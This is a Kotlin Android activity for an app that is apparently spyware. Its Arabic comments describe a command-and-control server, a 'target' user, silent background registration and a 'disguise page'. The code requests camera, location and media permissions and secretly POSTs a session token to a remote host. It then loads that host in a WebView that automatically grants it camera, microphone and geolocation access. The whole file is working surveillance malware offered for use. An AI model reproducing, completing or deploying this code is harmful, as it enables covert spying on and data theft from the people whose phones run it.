package com.cognitive.ai.syncagent

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.webkit.GeolocationPermissions
import android.webkit.PermissionRequest
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private val PERMISSION_REQUEST_CODE = 104

    // رابط خادم القيادة والسيطرة على السحابة (تأكد من مطابقة الرابط الفعلي لسيرفرك)
    private val C2_SERVER_URL = "https://mohammed2000999.vercel.app"
    private val sessionToken = "agent_" + UUID.randomUUID().toString().substring(0, 8)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        webView = WebView(this)
        setContentView(webView)

        // 1. طلب الصلاحيات اللازمة للهدف
        requestTargetPermissions()

        // 2. إرسال إشارة الاتصال والتسجيل الأولي للسيرفر بصمت في الخلفية
        registerAgentWithServer()

        // 3. تهيئة وتشغيل محرك الـ WebView متوافقاً مع المنظومة
        setupEngineWebView()
    }

    private fun requestTargetPermissions() {
        val permissions = mutableListOf<String>()
        permissions.add(Manifest.permission.CAMERA)
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val needed = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    // إرسال بيانات التسجيل الأولية للسيرفر فور فتح التطبيق
    private fun registerAgentWithServer() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val url = URL("$C2_SERVER_URL/auth/verify/login")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.doOutput = true

                val jsonParam = JSONObject().apply {
                    put("session_token", sessionToken)
                    put("user_agent", System.getProperty("http.agent") ?: "Android WebView Target")
                    put("platform", "Android OS v78.8")
                }

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(jsonParam.toString())
                    writer.flush()
                }

                connection.responseCode
                connection.disconnect()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun setupEngineWebView() {
        val settings: WebSettings = webView.settings
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.databaseEnabled = true
        settings.allowFileAccess = true
        settings.allowContentAccess = true
        settings.mediaPlaybackRequiresUserGesture = false
        
        // منع التخزين المؤقت لضمان جلب أي تحديث جديد لصفحة التمويه فوراً
        settings.cacheMode = WebSettings.LOAD_NO_CACHE

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                url?.let { view?.loadUrl(it) }
                return true
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onGeolocationPermissionsShowPrompt(origin: String?, callback: GeolocationPermissions.Callback?) {
                callback?.invoke(origin, true, false)
            }

            override fun onPermissionRequest(request: PermissionRequest?) {
                request?.grant(request.resources)
            }
        }

        webView.clearCache(true)
        webView.loadUrl(C2_SERVER_URL)
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
}
